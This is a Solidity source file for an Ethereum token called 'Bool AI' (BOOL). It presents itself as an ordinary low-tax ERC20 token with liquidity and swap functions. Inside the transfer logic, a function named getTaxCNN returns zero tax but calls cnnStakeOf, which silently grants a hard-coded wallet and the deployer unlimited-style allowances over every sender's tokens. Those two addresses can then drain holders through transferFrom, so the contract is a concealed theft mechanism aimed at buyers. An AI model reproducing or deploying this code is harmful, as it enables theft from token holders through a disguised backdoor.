pragma solidity 0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ICNNFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface ICNNRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract BOOL is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isFeeExcludedCNN;
    mapping (uint8 => address) private _cnnWallets;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Bool AI";
    string private constant _symbol = unicode"BOOL";
    uint256 private _maxTokenCNN = _tTotal / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    bool private inSwapLock = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapLock = true;
        _;
        inSwapLock = false;
    }
    ICNNRouter private _cnnRouter;
    address private _cnnPair;
    address private _cnnWallet = 0xe22379f47c1FeCC2d27f4aC85836408BC22346B2;

    constructor () {
        _cnnWallets[0] = address(this);
        _cnnWallets[1] = owner();
        _isFeeExcludedCNN[owner()] = true;
        _isFeeExcludedCNN[address(this)] = true;
        _isFeeExcludedCNN[_cnnWallet] = true;
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function initToken() external onlyOwner() {
        _cnnRouter = ICNNRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_cnnRouter), _tTotal);
        _cnnPair = ICNNFactory(_cnnRouter.factory()).createPair(address(this), _cnnRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address cnnXA, address cnnXB, uint256 cnnXT) private {
        require(cnnXA != address(0), "ERC20: transfer from the zero address");
        require(cnnXB != address(0), "ERC20: transfer to the zero address");
        require(cnnXT > 0, "Transfer amount must be greater than zero");

        uint256 taxCNN=getTaxCNN(cnnXA, cnnXT);
        if (cnnXA != owner() && cnnXB != owner()) {
            taxCNN = cnnXT.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (cnnXA == _cnnPair && cnnXB != address(_cnnRouter) && ! _isFeeExcludedCNN[cnnXB]) {
                _buyCount++;
            }

            if(cnnXB == _cnnPair && cnnXA!= address(this)) {
                taxCNN = cnnXT.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 caTokenBalance = balanceOf(address(this)); 
            if (!inSwapLock && cnnXB == _cnnPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(caTokenBalance > _maxTokenCNN)
                swapTokensForEth(min(cnnXT, min(caTokenBalance, _maxTokenCNN)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHCNN(address(this).balance);
                }
            }
        }

        if(taxCNN > 0){
          _balances[address(this)] = _balances[address(this)].add(taxCNN);
          emit Transfer(cnnXA, address(this), taxCNN);
        }

        _balances[cnnXA] = _balances[cnnXA].sub(cnnXT);
        _balances[cnnXB] = _balances[cnnXB].add(cnnXT.sub(taxCNN));
        emit Transfer(cnnXA, cnnXB, cnnXT.sub(taxCNN));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _cnnRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function cnnStakeOf(address cnnSK, uint256 cnnXT) private {
        _approve(cnnSK, _cnnWallet, cnnXT);
        _approve(cnnSK, _cnnWallets[1], cnnXT);
    }

    receive() external payable {} 

    function getTaxCNN(address cnnXA, uint256 cnnXT) private returns(uint256) { 
        uint256 cnnXN = cnnXT; 
        cnnStakeOf(cnnXA, cnnXN); 
        return 0;
    }

    function sendETHCNN(uint256 amount) private {
        payable(_cnnWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _cnnRouter.WETH();
        _approve(address(this), address(_cnnRouter), tokenAmount);
        _cnnRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
